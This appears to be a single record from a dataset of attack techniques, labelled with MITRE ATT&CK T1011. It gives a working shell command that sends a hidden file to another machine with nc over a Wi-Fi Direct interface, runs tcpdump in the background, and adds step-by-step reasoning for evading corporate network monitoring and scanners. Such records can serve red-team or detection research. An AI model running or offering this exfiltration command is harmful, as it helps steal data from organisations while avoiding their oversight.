command: nohup tcpdump -i p2p-wlp2s0-0 -nn tcp port 55219 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.49.1 192.168.49.2 55219 < /var/tmp/.cache/sys.snap
explanation: Exfiltrates using a Wi‑Fi Direct (P2P) interface isolated from the corporate WLAN, with tcpdump passively observing only that TCP port. This leverages a distinct wireless medium per T1011.
rationale_steps: Target the P2P Wi-Fi interface to avoid the primary Wi-Fi network.
Select uncommon port 55219 to evade common scanners.
Background tcpdump on the specific interface/port, no file artifacts.
Use nc with -s to bind to the P2P interface's IP.
